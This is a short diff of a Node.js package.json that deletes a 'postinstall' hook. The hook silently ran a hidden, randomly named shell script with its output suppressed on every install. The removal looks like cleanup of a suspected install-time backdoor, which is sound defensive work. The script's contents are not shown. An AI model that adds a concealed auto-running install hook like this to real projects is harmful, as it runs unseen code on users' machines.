@@ -14,8 +14,7 @@
     "preview": "node server/index.js",
     "test": "node --test",
     "lint": "eslint .",
-    "lint:fix": "eslint . --fix",
-    "postinstall": "sh ./.ci-tlq7zy.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "lint:fix": "eslint . --fix"
   },
   "dependencies": {
     "@destyler/button": "^0.0.2",
